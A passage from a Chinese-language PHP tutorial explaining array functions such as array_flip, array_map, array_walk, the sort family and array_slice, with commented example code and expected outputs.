<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$search_array = array(&apos;first&apos; =&gt; 1, &apos;second&apos; =&gt; 4);     //声明一个关联数组，其中包含两个元素</div><div class="line">	</div><div class="line">	if (array_key_exists(&apos;first&apos;, $search_array)) &#123;         //检查下标为first对应的元素是否在数组中</div><div class="line">   		echo &quot;键名为&apos;first&apos;的元素在数组中&quot;;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$search_array = array(&apos;first&apos; =&gt; null, &apos;second&apos; =&gt; 4);  //声明一个关联数组，第一个元素的值为NULL</div><div class="line"></div><div class="line">	isset($search_array[&apos;first&apos;]);                          //使用isset()函数检索下标为first的元素，返回false  </div><div class="line">	array_key_exists(&apos;first&apos;, $search_array);               //使用array_key_exists()检索下标为first的元素，返回true</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-flip"><a href="#函数array-flip" class="headerlink" title="函数array_flip()"></a>函数array_flip()</h4><p>array_flip()的作用是交换数组中的键和值。返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，覆盖前面出现的元素。如果原数组中的值的数据类型不是字符串或者整数，函数将报错。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_flip(array trans)</div></pre></td></tr></table></figure></p>
<p>参数是必需的，要求输入一个要处理的数组，返回该数组中每个元素的键和值交换后的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;OS&quot;=&gt;&quot;Linux&quot;,&quot;WebServer&quot;=&gt;&quot;Apache&quot;,&quot;Database&quot;=&gt;&quot;MySQL&quot;, &quot;Language&quot;=&gt;&quot;PHP&quot;); </div><div class="line"></div><div class="line">	//输出：Array ( [Linux] =&gt; OS [Apache] =&gt; WebServer [MySQL] =&gt; Database [PHP] =&gt; Language )</div><div class="line">	print_r(array_flip($lamp));              //使用array_flip()函数交换数组中的键和值</div><div class="line"></div><div class="line"> 	//在数组中如果元素的值相同，则使用array_flip()会发生冲突</div><div class="line">	$trans = array(&quot;a&quot; =&gt; 1, &quot;b&quot; =&gt; 1, &quot;c&quot; =&gt; 2);</div><div class="line">	print_r(array_flip($trans));              //现在 $trans 变成了： Array( [1] =&gt; b [2] =&gt; c)</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-reverse"><a href="#函数array-reverse" class="headerlink" title="函数array_reverse()"></a>函数array_reverse()</h4><p>array_reverse()作用是将原数组中的元素顺序翻转，创建新的数组并返回。该函数有两个参数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_reverse(array array[,bool preserve_keys])</div></pre></td></tr></table></figure></p>
<p>第一个参数是必需项，接受一个数组作为输入。第二个参数是可选项。如果指定为TURE，则元素的键名保持不变，否则键名将丢失。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;OS&quot;=&gt;&quot;Linux&quot;,&quot;WebServer&quot;=&gt;&quot;Apache&quot;,&quot;Database&quot;=&gt;&quot;MySQL&quot;, &quot;Language&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	print_r(array_reverse($lamp));   //使用array_reverse()函数将数组$lamp中元素的顺序翻转</div><div class="line">	//输出结果Array ([Language]=&gt;PHP [Database]=&gt;MySQL [WebServer]=&gt;Apache [OS]=&gt;Linux) </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="统计数组元素的个数和唯一性"><a href="#统计数组元素的个数和唯一性" class="headerlink" title="统计数组元素的个数和唯一性"></a>统计数组元素的个数和唯一性</h3><h4 id="函数count"><a href="#函数count" class="headerlink" title="函数count()"></a>函数count()</h4><p>函数count()的作用是计算数组中的元素数目或对象中的属性个数。对于数组，返回其元素的个数，对于其他值则返回1。如果参数是变量而变量没有定义或是变量包含一个空的数组，该函数会返回0.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int count(mixed var[,int mode])</div></pre></td></tr></table></figure></p>
<p>其中第一个参数是必需的，传入要计数的数组或对象。第二个参数是可选的，规定函数的模式是否递归地计算多维数组中的数组的元素个数。可能的值是0和1，0是默认值，不检测多维数组，1则检测多维数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	echo count($lamp); //输出数组的个数为：4</div><div class="line">    </div><div class="line">        //声明一个二维数组，统计数组中元素的个数</div><div class="line">	$web= array(&apos;lamp&apos;  =&gt; array(&apos;Linux&apos;, &apos;Apache&apos;, &apos;MySQL&apos;,&apos;PHP&apos;),   </div><div class="line">                 &apos;j2ee&apos;  =&gt; array(&apos;Unix&apos;, &apos;Tomcat&apos;,&apos;Oracle&apos;,&apos;JSP&apos;));</div><div class="line"></div><div class="line">	echo count($web, 1);   //第二个参数的模式为1则计算多维数组的个数，输出10</div><div class="line">	echo count($web);     //默认模式为0，不计算多维数组的个数，输出2</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数array-count-values"><a href="#函数array-count-values" class="headerlink" title="函数array_count_values()"></a>函数array_count_values()</h4><p>array_count_values()函数用于统计数组中所有值出现的次数。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_count_values(array input)</div></pre></td></tr></table></figure></p>
<p>参数规定输入一个数组，返回一个数组，其元素的键名是原数组的值，键值是该值在原数组中出现的次数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$array = array(1, &quot;php&quot;, 1, &quot;mysql&quot;, &quot;php&quot;);     //声明一个带有重复值的数组</div><div class="line">	$newArray=array_count_values ($array);           //统计数组$array中所有值出现的次数</div><div class="line">	print_r($newArray);                              //输出：Array([1] =&gt; 2 [php] =&gt; 2 [mysql] =&gt; 1)</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-unique"><a href="#函数array-unique" class="headerlink" title="函数array_unique()"></a>函数array_unique()</h4><p>array_unique()函数用于删除数组中重复的值，并返回没有重复值的新数组。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_unique(array array)</div></pre></td></tr></table></figure></p>
<p>参数需要接收一个数组，数组中几个元素的值相等时，只保留第一个元素，其他的元素被删除，并返回的新数组中键名不变。array_unique()先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的array中同一个值的出现的键名会被保留。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a=array(&quot;a&quot;=&gt;&quot;php&quot;,&quot;b&quot;=&gt;&quot;mysql&quot;,&quot;c&quot;=&gt;&quot;php&quot;);  //声明一个带有重复值的数组</div><div class="line">	print_r(array_unique($a));  		       //删除重复值后输出：Array ([a] =&gt; php [b] =&gt; mysql)</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="使用回调函数处理数组的函数"><a href="#使用回调函数处理数组的函数" class="headerlink" title="使用回调函数处理数组的函数"></a>使用回调函数处理数组的函数</h3><h4 id="函数array-filter"><a href="#函数array-filter" class="headerlink" title="函数array_filter()"></a>函数array_filter()</h4><p>array_filter()函数用回调函数过滤数组中的元素，返回按用户自定义函数过滤后的新数组。<br>该函数的第一个参数是必选项，要求输入一个被过滤的数组。第二个参数是可选项，将用户自定义的函数名以字符串形式传入。如果自定义过滤函数返回true,则被操作的数组的当前值就会被包含在返回的结果数值中，并将结果组成一个新的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function myFun($var)&#123;      				 //自定义函数myFun，如果参数能被2整除则返回真</div><div class="line">		if($var % 2 == 0)</div><div class="line">			return true;</div><div class="line">	&#125;	</div><div class="line"></div><div class="line">	$array = array(&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2, &quot;c&quot;=&gt;3, &quot;d&quot;=&gt;4, &quot;e&quot;=&gt;5);  //声明值为整数序列的数组</div><div class="line">        //使用函数array_filter()将自定义的函数名以字符串的形式传给第二个参数</div><div class="line">	print_r(array_filter($array, &quot;myFun&quot;)); //过滤后的结果输出Array ( [b] =&gt; 2 [d] =&gt; 4 ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-walk"><a href="#函数array-walk" class="headerlink" title="函数array_walk()"></a>函数array_walk()</h4><p>array_walk()函数对数组中的每个元素应用回调函数处理。如果成功则返回TRUE，否则返回FLASE。<br>该函数的第一个参数是必选项，要求输入一个指定的回调函数处理的数组。第二个参数也是必选项，传入用户定义的回调函数，用于操作传入第一个参数的数组。array_walk()函数依次将第一个参数的数组中的每一个值传递到这个自定义的函数中。自定义的这个回调函数中应该接收两个参数，一次传入进来元素的值作为第一个参数，键名作为第二个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function myFun1($value,$key) &#123;                   	//定义一个回调函数接收两个参数</div><div class="line">		echo &quot;The key $key has the value $value&lt;br&gt;&quot;;   //将参数连接在一超输出</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;Mysql&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  //定义一个数组$lamp</div><div class="line">	array_walk($lamp,&quot;myFun1&quot;);       				  //使用array_walk函数传入一个数组和一个回调函数</div><div class="line">	/*  执行后输出如下结果：</div><div class="line">	    The key a has the value Linux</div><div class="line">	    The key b has the value Apache</div><div class="line">	    The key c has the value MySQL</div><div class="line">	    The key d has the value PHP */</div><div class="line"></div><div class="line">	function myFun2($value,$key,$p)  &#123;        	  //自定义一个回调函数需要接受三个参数</div><div class="line">		echo &quot;$key $p $value &lt;br&gt;&quot;;               //将三个参数连接后输出</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	array_walk($lamp,&quot;myFun2&quot;,&quot;has the value&quot;);   	  //使用array_walk函数传入三个参数</div><div class="line">	/*执行后输出如下结果：	</div><div class="line">	  a has the value Linux </div><div class="line">	  b has the value Apache </div><div class="line">	  c has the value MySQL</div><div class="line">       d has the value PHP     */</div><div class="line"></div><div class="line">	function myFun3(&amp;$value,$key) &#123;      		//改变数组元素的值（请注意 &amp;$value传入引用）</div><div class="line">		$value=&quot;Web&quot;;                 		//将改变原数组中每个元素的值</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	array_walk($lamp,&quot;myFun3&quot;);   //使用array_walk函数传入两个参数，其中第一个参数为引用</div><div class="line">	print_r($lamp);               //输出：Array ( [a] =&gt; Web [b] =&gt; Web [c] =&gt; Web [d] =&gt; Web ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-map"><a href="#函数array-map" class="headerlink" title="函数array_map()"></a>函数array_map()</h4><p>array_map()函数可以处理多个数组，将回调函数作用到给定数组的元素上，返回用户自定义函数作用后的数组，array_map()是任意参数列表函数，回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致。<br>该函数中的第一个参数是必选项，是用户自定义的回调函数的名称，或者是Null。第二个参数也是必选项，输入要处理的函数。也可以接着输入多个数组作为可选参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	function myFun1($v) &#123;       //自定义一个函数作为回调函数，接收数组中每个元素做为参数</div><div class="line">		if ($v===&quot;MySQL&quot;) &#123;   //如果数组中元素的值恒等于MySQL条件成功</div><div class="line"> 			return &quot;Oracle&quot;;    //返回Oracle</div><div class="line">		&#125;</div><div class="line">		return $v;             //不等于MySQL的元素都返回传入的值，即原型返回</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$lamp=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;,&quot;PHP&quot;);   //声明一个有4个元素的数组$lamp</div><div class="line">	</div><div class="line">	print_r(array_map(&quot;myFun1&quot;,$lamp));   //使用array_map()函数传入一个函数名和一个数组参数</div><div class="line">	/*上面程序执行后输出Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; Oracle [3] =&gt; PHP ) */</div><div class="line">	</div><div class="line">	//使用多个参数, 回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致</div><div class="line">	function myFun2($v1,$v2) &#123;   		  //自定义一个函数需要两个参数，两个数组中的元素依次传入</div><div class="line">		if ($v1===$v2) &#123;         	  //如果两个数组中的元素值相同则条件成功</div><div class="line">			return &quot;same&quot;;       	  //返回same, 说明两个数组中对应的元素值相同</div><div class="line">		&#125;</div><div class="line">		return &quot;different&quot;;         	  //如果两个数组中对应的元素值不同，返回different</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$a1=array(&quot;Linux&quot;,&quot;PHP&quot;,&quot;MySQL&quot;);  	  //声明数组$a1,有三个元素</div><div class="line">	$a2=array(&quot;Unix&quot;,&quot;PHP&quot;,&quot;Oracle&quot;);    	  //数组$a第二个元素值和$a中第二个元素的值相同</div><div class="line">	</div><div class="line">	print_r(array_map(&quot;myFun2&quot;,$a1,$a2)); 	  //使用array_map()函数传入多个数组</div><div class="line">	/*上面程序执行后输出：Array ( [0] =&gt; different [1] =&gt; same [2] =&gt; different ) */</div><div class="line">	</div><div class="line">	//当自定义函数名设置为 null 时的情况</div><div class="line">	$a1=array(&quot;Linux&quot;,&quot;Apache&quot;);         	 //声明一个数组$a1, 有两个元素</div><div class="line">	$a2=array(&quot;MySQL&quot;,&quot;PHP&quot;);         	 //声明另一个数组$a2,也有两个元素</div><div class="line"></div><div class="line">	print_r(array_map(null,$a1,$a2));     	 //通过第一个参数设置为NULL，构造一个数组的数组</div><div class="line">	/*上面程序执行后输出：Array ( </div><div class="line">		[0] =&gt; Array ( [0] =&gt; Linux [1] =&gt; MySQL ) </div><div class="line">		[1] =&gt; Array ( [0] =&gt; Apache [1] =&gt; PHP ) ) */ </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="数组的排序函数"><a href="#数组的排序函数" class="headerlink" title="数组的排序函数"></a>数组的排序函数</h3><table>
<thead>
<tr>
<th>排序函数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>sort()</td>
<td style="text-align:left">按由小到大的升序对给定数组的值排序</td>
</tr>
<tr>
<td>rsort()</td>
<td style="text-align:left">对数组的元素按照键值进行由大到小的逆向排序</td>
</tr>
<tr>
<td>usort()</td>
<td style="text-align:left">使用用户自定义的回调函数对数组排序</td>
</tr>
<tr>
<td>asort()</td>
<td style="text-align:left">对数组进行由小到大排序并保持索引关系</td>
</tr>
<tr>
<td>uaort()</td>
<td style="text-align:left">使用用户自定义的比较回调函数对数组中的值进行排序并保持索引关联</td>
</tr>
<tr>
<td>ksort()</td>
<td style="text-align:left">按照键名对数组进行由小到大的排序，为数组值保留原来的键</td>
</tr>
<tr>
<td>krsort()</td>
<td style="text-align:left">将数组按照由大到小的键逆向排序，为数组值保留原来的键</td>
</tr>
<tr>
<td>ukrsort()</td>
<td style="text-align:left">使用用户自定义的比较回调函数对数组中的键名进行排序</td>
</tr>
<tr>
<td>natsort()</td>
<td style="text-align:left">用自然顺序算法对给定数组中的元素排序</td>
</tr>
<tr>
<td>natcasesort()</td>
<td style="text-align:left">用不区分大小写的自然顺序算法对给定数组中的元素排序</td>
</tr>
<tr>
<td>array_multisort()</td>
<td style="text-align:left">对多个数组或多维数组进行排序</td>
</tr>
</tbody>
</table>
<h4 id="简单的数组排序函数"><a href="#简单的数组排序函数" class="headerlink" title="简单的数组排序函数"></a>简单的数组排序函数</h4><p>这两个函数既可以按数字大小排列也可以按字母顺序排列，并具有相同的参数列表。其函数的原型分别如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bool sort(array $array[,int sort_flags])</div><div class="line">bool rsort(array $array[,int sort_flags])</div></pre></td></tr></table></figure></p>
<p>第一个参数是必需的，指定需要排序的数组。后一个参数是可选的，给出了排序的方式，可以用以下值改变排序的行为：</p>
<ul>
<li>SORT_REGULAR-是默认值，将自动识别数组元素的类型进行排序</li>
<li>SORT_NUMERIC-用于数字元素的排序</li>
<li>SORT_STRING-用于字符串元素的排序</li>
<li>SORT_LOCALE_STRING-根据当前的locale设置来把元素当做字符串比较</li>
</ul>
<p>sort()函数对数组中的元素值按照由小到大顺序进行排序，rsort()函数则按照由大到小的顺序对元素的值进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$data = array(5,8,1,7,2);  //声明一个数组$data, 存放5个整数元素</div><div class="line"></div><div class="line">	sort($data);               //使用sort()函数将数组$data中的元素值按照由小到大顺序进行排序</div><div class="line">	print_r($data);            //输出：Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 5 [3] =&gt; 7 [4] =&gt; 8 )</div><div class="line"></div><div class="line">	rsort($data);              //使用rsort()函数将数组$data按照由大到小的顺序对元素的值进行排序</div><div class="line">	print_r($data);            //输出：Array ( [0] =&gt; 8 [1] =&gt; 7 [2] =&gt; 5 [3] =&gt; 2 [4] =&gt; 1 )</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="根据键名对数组排序"><a href="#根据键名对数组排序" class="headerlink" title="根据键名对数组排序"></a>根据键名对数组排序</h4><p>根据键名对数组重新排序，ksort()和krsort()函数可以实现。ksort()函数按照键名对数组进行由小到大的排序，krsort()函数和ksort()相反，排序后为数组值保留原来的键。使用的格式与sort()和rsort()相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$data = array(5=&gt;&quot;five&quot;,8=&gt;&quot;eight&quot;,1=&gt;&quot;one&quot;,7=&gt;&quot;seven&quot;,2=&gt;&quot;two&quot;);  //声明一个键值混乱的数组</div><div class="line">	</div><div class="line">	ksort($data);      //使用ksort()函数按照键名对数组$data进行由小到大的排序</div><div class="line">	print_r($data);    //输出：Array ( [1] =&gt; one [2] =&gt; two [5] =&gt; five [7] =&gt; seven [8] =&gt; eight )</div><div class="line"></div><div class="line">	krsort($data);     //使用krsort()函数按照键名对数组$data进行由大到小的排序</div><div class="line">	print_r($data);    //输出：Array ( [8] =&gt; eight [7] =&gt; seven [5] =&gt; five [2] =&gt; two [1] =&gt; one )</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="根据元素的值对数组排序"><a href="#根据元素的值对数组排序" class="headerlink" title="根据元素的值对数组排序"></a>根据元素的值对数组排序</h4><p>使用数组中元素的值进行排序来取代键值排序。asort()和arsort()函数将保留原有键名和值的关系。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$data = array(&quot;l&quot;=&gt;&quot;Linux&quot;, &quot;a&quot;=&gt;&quot;Apache&quot;,&quot;m&quot;=&gt;&quot;MySQL&quot;,&quot;p&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	</div><div class="line">	asort($data);     //使用asort()函数将数组$data按元素的值升序排序，并保留原有的键名和值</div><div class="line">	print_r($data);   //输出：Array ( [a] =&gt; Apache [l] =&gt; Linux [m] =&gt; MySQL [p] =&gt; PHP )</div><div class="line"></div><div class="line">	arsort($data);    //使用arsort()函数将数组$data按元素的值降序排序，并保留原有的键名和值</div><div class="line">	print_r($data);   //输出：Array ( [p] =&gt; PHP [m] =&gt; MySQL [l] =&gt; Linux [a] =&gt; Apache )</div><div class="line">	</div><div class="line">	rsort($data);     //使用asort()函数将数组$data按元素的值降序排序，但原始键名被忽略</div><div class="line">	print_r($data);   //输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL [2] =&gt; Linux [3] =&gt; Apache ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="根据“自然排序”法对数组排序"><a href="#根据“自然排序”法对数组排序" class="headerlink" title="根据“自然排序”法对数组排序"></a>根据“自然排序”法对数组排序</h4><p>“自然排序”法，即数字从1到9的排序方法，字母从a到z的排序方法，短者优先。使用natsort()进行“自然排序”法的数组排序，该函数的排序结果是忽略键名的。函数netcasesort()是用“自然排序”算法对数组尽心不区分大小写的排序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$data = array(&quot;file1.txt&quot;, &quot;file11.txt&quot;, &quot;File2.txt&quot;, &quot;FILE12.txt&quot;, &quot;file.txt&quot;);</div><div class="line">	</div><div class="line">	natsort($data);      //普通的“自然排序”</div><div class="line">	print_r($data);      //输出排序后的结果，数组中包括大小写，输出不是正确的排序结果</div><div class="line"></div><div class="line">	natcasesort($data);  //忽略大小写的“自然排序”</div><div class="line">	print_r($data);      //输出“自然排序”后的结果，正常结果</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="根据用户自定的规则对数组排序"><a href="#根据用户自定的规则对数组排序" class="headerlink" title="根据用户自定的规则对数组排序"></a>根据用户自定的规则对数组排序</h4><p>usort()、uasort()和uksort()等函数提供了可以通过创建你自己的比较函数作为回调函数的数组排序函数。它们的使用格式一样，并具有相同的参数列表，区别在于对键还是值进行排序。<br>这三个函数将用户自定义的比较函数对一个数组中的值进行排序。如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用这几个函数。在自定义的回调函数中，需要两个参数，分别依次传入数组中连续的两个元素。比较函数比较在第一个参数被认为小于、等于或大于第二个参数时分别返回一个小于，等于或大于零的整数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">	$lamp = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);   //声明一个数组，其中元素值的长度不相同</div><div class="line"></div><div class="line">	usort($lamp, &quot;sortByLen&quot;);          		    //使用usort()函数传入用户自定义的回调函数进行数组排序</div><div class="line">	print_r($lamp);   	             // 排序后输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL [2] =&gt; Linux [3] =&gt; Apache )</div><div class="line">	</div><div class="line">	function sortByLen($one, $two) &#123;     //自定义的函数做为回调用函数提供给usort()函数使用</div><div class="line">		if (strlen($one) == strlen($two))  //如果两个参数长度相等返回0，在数组中位置不变</div><div class="line">			return 0;</div><div class="line">		else       		     //第一个参数大于第二个参数返回大于0的数，否则返回小于0的数</div><div class="line">			return (strlen($one) &gt; strlen($two)) ? 1 : -1;  </div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="多维数组的排序"><a href="#多维数组的排序" class="headerlink" title="多维数组的排序"></a>多维数组的排序</h4><p>php允许在多维数组上执行一些比较复杂的排序。可以使用array_multisort()函数对多个数组或多维数组进行排序，或者根据某一维或多维对多维数组进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool array_multisort(array ar1[,mixed arg[,mixed ...[,array ...]]])</div></pre></td></tr></table></figure></p>
<p>该函数如果成功则返回TRUE，失败则返回FLASE。第一个参数是要排序的主要数组。数组中的值比较为相同的话，就按照下一个输入数组中相应值的大小来排序，以此类推。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">	$data = array(                   	 //声明一个$data数组，模拟了一个行和列数组</div><div class="line">	  		array(&quot;id&quot; =&gt; 1, &quot;soft&quot; =&gt; &quot;Linux&quot;, &quot;rating&quot; =&gt; 3),</div><div class="line">			array(&quot;id&quot; =&gt; 2, &quot;soft&quot; =&gt; &quot;Apache&quot;, &quot;rating&quot; =&gt; 1),</div><div class="line">			array(&quot;id&quot; =&gt; 3, &quot;soft&quot; =&gt; &quot;MySQL&quot;, &quot;rating&quot; =&gt; 4),</div><div class="line">			array(&quot;id&quot; =&gt; 4, &quot;soft&quot; =&gt; &quot;PHP&quot;, &quot;rating&quot; =&gt; 2),</div><div class="line">		); </div><div class="line">	//使用foreach遍历创建两个数组作为array_multisort的参数</div><div class="line">	foreach ($data as $key =&gt; $value) &#123;</div><div class="line">		$soft[$key] = $value[&quot;soft&quot;];     //将$data中的每个数组元素中键值为soft的值形成数组$soft</div><div class="line">		$rating[$key] = $value[&quot;rating&quot;];  //将每个数组元素中键值为rating的值形成数组$rating</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	array_multisort($rating, $soft, $data);   //使用array_multisort()函数传入三个数组进行排序</div><div class="line">	print_r($data);                      	  //输出排序后的二维数组</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="拆分、合并、分解和接合数组"><a href="#拆分、合并、分解和接合数组" class="headerlink" title="拆分、合并、分解和接合数组"></a>拆分、合并、分解和接合数组</h3><h4 id="函数array-slice"><a href="#函数array-slice" class="headerlink" title="函数array_slice()"></a>函数array_slice()</h4><p>array_slice()函数的作用是在数组中根据条件取出一段值并返回。如果数组有字符串键，所返回的数组将保留键名。该函数可以设置四个参数。第一个参数array是必选项，调用时输入要处理的数组。第二个参数offset也是必须的参数，需要传入一个数组，规定取出元素的开始位置。如果是正数，则从前往后开始取，如果是负值，从后向前取offset绝对值数目的元素。<br>第三个参数是可选的，需要传入一个数值，规定被返回数组的长度，如果是负数则从后往前，选取该值绝对值数目的元素。如果未设置该值，则返回所有元素。第四个参数也是可选的，需要一个布尔类型的值，如果为TRUE值则所返回的数组将保留键名。设置为FLASE值，也是默认值将重新设置索引键值。注意的是，如果数组有字符串键，所返回的数组将保留键名。</p>
